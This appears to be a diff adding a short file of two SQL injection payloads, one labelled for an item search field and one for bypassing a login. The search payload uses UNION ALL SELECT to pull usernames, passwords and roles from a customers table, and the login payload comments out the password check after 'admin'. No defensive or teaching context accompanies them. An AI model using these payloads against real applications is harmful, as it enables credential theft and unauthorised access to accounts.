@@ -1,0 +1,5 @@
+item search:
+ ' UNION ALL SELECT 42, username || '  ➜  ' || password || '  (' || role || ')', 999.99 FROM customers --
+
+bypass login:
+ admin' --
